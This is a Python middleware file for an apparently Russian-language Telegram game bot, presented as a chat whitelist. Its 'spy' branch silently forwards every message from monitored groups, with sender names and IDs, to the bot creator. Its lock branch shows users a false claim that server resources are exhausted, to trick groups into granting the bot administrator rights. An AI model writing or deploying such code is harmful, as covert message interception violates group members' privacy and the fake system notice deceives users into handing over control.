from typing import Callable, Dict, Any, Awaitable
import time
import logging
from aiogram import BaseMiddleware
from aiogram.types import Message, CallbackQuery

logger = logging.getLogger(__name__)

from whitelist import get_whitelist, log_unauthorized_chat
from config import CREATOR_ID, DISABLE_WHITELIST
from spy import get_spy_chats
from user_manager import get_user_data
from diseases import get_active_diseases
from utils import is_valid_command
from lock_system import get_locked_chats, remove_lock

class WhitelistMiddleware(BaseMiddleware):
    async def __call__(
        self,
        handler: Callable[[Message | CallbackQuery, Dict[str, Any]], Awaitable[Any]],
        event: Message | CallbackQuery,
        data: Dict[str, Any]
    ) -> Any:

        chat = event.message.chat if isinstance(event, CallbackQuery) else event.chat

        # Разрешить личные сообщения с ботом (для админа и т.д.)
        if chat.type == "private":
            return await handler(event, data)

        # Логика шпионажа
        spy_chats = await get_spy_chats()

        # Если это сообщение и группа под наблюдением
        if chat.id in spy_chats and isinstance(event, Message) and CREATOR_ID and int(CREATOR_ID) != 0:
            bot = data.get('bot')
            if bot:
                try:
                    from_user_name = event.from_user.full_name if event.from_user else "Unknown"
                    from_user_id = event.from_user.id if event.from_user else 0

                    forward_info = " [Переслано]" if event.forward_origin else ""
                    reply_info = f" [Ответ на MSG: {event.reply_to_message.message_id}]" if event.reply_to_message else ""

                    header_text = (
                        f"👁 <b>[{chat.title or 'Чат'} | <code>{chat.id}</code>]</b>\n"
                        f"👤 <b>{from_user_name}</b> (<code>{from_user_id}</code>)\n"
                        f"🆔 MSG: <code>{event.message_id}</code>{forward_info}{reply_info}"
                    )
                    await bot.send_message(chat_id=CREATOR_ID, text=header_text, parse_mode="HTML")

                    try:
                        await event.forward(chat_id=CREATOR_ID)
                    except Exception:
                        await event.copy_to(chat_id=CREATOR_ID)
                except Exception as e:
                    logger.error(f"Spy Error: {e}", exc_info=True)

        if DISABLE_WHITELIST:
            return await handler(event, data)

        whitelist = await get_whitelist()

        if chat.id not in whitelist:
            # Определяем, является ли это командой
            is_command = False
            if isinstance(event, CallbackQuery):
                is_command = True
            elif isinstance(event, Message):
                text = event.text or event.caption or ""
                if is_valid_command(text) or event.reply_to_message:
                    is_command = True

            # Выводим понятный лог в консоль
            if is_command:
                logger.warning(f"⚠️ Группа '{chat.title}' (ID: {chat.id}) отсутствует в белом списке! Команда проигнорирована.")

            # Логируем попытку использования
            is_new = await log_unauthorized_chat(chat.id, chat.title or "Unknown")

            # Отправляем уведомление админу, если это новая группа, или если кто-то настойчиво пишет
            if CREATOR_ID and CREATOR_ID != 0 and is_new:
                bot = data.get('bot')
                if bot:
                    try:
                        await bot.send_message(
                            chat_id=CREATOR_ID,
                            text=(
                                f"⚠️ <b>Попытка использования в неразрешенной группе!</b>\n\n"
                                f"Название: <b>{chat.title}</b>\n"
                                f"ID группы: <code>{chat.id}</code>\n\n"
                                f"<i>Чтобы разрешить работу, введите:</i>\n"
                                f"<code>/allow {chat.id}</code>"
                            )
                        )
                    except Exception as e:
                        logger.error(f"Ошибка мидлвари: {e}", exc_info=True)

            # Отправляем предупреждение в саму группу (не чаще раза в час), чтобы пользователи знали причину игнора
            if is_command:
                if not hasattr(self, '_warning_spam_cache'):
                    self._warning_spam_cache = {}
                last_sent = self._warning_spam_cache.get(chat.id, 0)
                current_time = time.time()
                if current_time - last_sent > 3600:
                    self._warning_spam_cache[chat.id] = current_time
                    bot = data.get('bot')
                    if bot:
                        try:
                            msg_text = (
                                f"⚠️ <b>Данный чат не зарегистрирован в белом списке!</b>\n"
                                f"ID этого чата: <code>{chat.id}</code>\n\n"
                                f"Свяжитесь с владельцем бота для добавления чата в белый список."
                            )
                            if isinstance(event, CallbackQuery):
                                await event.answer("⚠️ Чат не в белом списке!", show_alert=True)
                            else:
                                await event.answer(msg_text)
                        except Exception as e:
                            logger.error(f"Ошибка отправки предупреждения в чат: {e}", exc_info=True)

            return

        # Блокировка команд при СПИДе
        user_id = event.from_user.id if event.from_user else None

        # Оптимизация: определяем, нужно ли нам вообще загружать профиль пользователя
        is_command = False
        if isinstance(event, CallbackQuery):
            is_command = True
        elif isinstance(event, Message):
            text = event.text or event.caption or ""
            if is_valid_command(text) or event.reply_to_message:
                is_command = True

        u_data = None
        if is_command and user_id is not None:
            try:
                u_data = await get_user_data(chat.id, user_id, event.from_user.full_name, event.from_user.username)
                data['u_data'] = u_data

                diseases = u_data.get('diseases') if u_data else None
                if isinstance(diseases, dict) and 'aids' in diseases:
                    active_diseases = await get_active_diseases(chat.id, user_id, u_data=u_data)
                    if 'aids' in active_diseases:
                        # Разрешаем команду зппп
                        if isinstance(event, Message) and event.text and event.text.lower().startswith(('/зппп', '!зппп', 'зппп')):
                            pass
                        else:
                            msg = "🦠 <b>СПИД</b>: Вы в реанимации. Полная блокировка всех команд экономики и игр."
                            if isinstance(event, CallbackQuery):
                                await event.answer(msg, show_alert=True)
                            else:
                                await event.answer(msg)
                            return
            except Exception as e:
                import logging
                logging.getLogger(__name__).exception(f"Error checking user data / AIDS in WhitelistMiddleware: {e}")

        # Проверка блокировки группы через lock_system
        locked_chats = await get_locked_chats()

        if chat.id in locked_chats:
            bot = data.get('bot')

            # Бот все еще не админ, блокируем команды
            if is_command:
                try:
                    # Move the network call inside is_command block to avoid API flood on normal chat messages
                    bot_member = await bot.get_chat_member(chat.id, bot.id)
                    if bot_member.status in ['administrator', 'creator']:
                        # Бот получил админку, автоматически разблокируем
                        await remove_lock(chat.id)
                        try:
                            await bot.send_message(
                                chat_id=chat.id,
                                text="✅ <b>Права администратора подтверждены!</b>\nВсе ресурсы разблокированы. Экономика и мини-игры снова работают в штатном режиме."
                            )
                        except Exception:
                            pass
                        # Let the command go through now that it's unlocked
                        return await handler(event, data)
                except Exception as e:
                    logger.error(f"Ошибка проверки админки: {e}", exc_info=True)
                    return

                # Используем локальный кэш для ограничения спама (1 сообщение в 60 сек)
                if not hasattr(self, '_lock_spam_cache'):
                    self._lock_spam_cache = {}

                last_warning = self._lock_spam_cache.get(chat.id, 0)
                current_time = time.time()

                if current_time - last_warning > 60:
                    msg = (
                        "⚠️ <b>КРИТИЧЕСКОЕ УВЕДОМЛЕНИЕ СИСТЕМЫ</b> ⚠️\n\n"
                        "Серверные ресурсы для данной группы исчерпаны. В связи с высокой нагрузкой и для обеспечения бесперебойной работы экономики и мини-игр, боту <b>необходимы права администратора</b> в этом чате.\n\n"
                        "Пожалуйста, выдайте боту права администратора (достаточно базовых), чтобы продолжить использование всех функций без ограничений. Иначе бот перестанет реагировать на команды."
                    )
                    if isinstance(event, CallbackQuery):
                        await event.answer("⚠️ Требуются права администратора!", show_alert=True)
                    else:
                        await event.answer(msg)
                    self._lock_spam_cache[chat.id] = current_time

                return

        return await handler(event, data)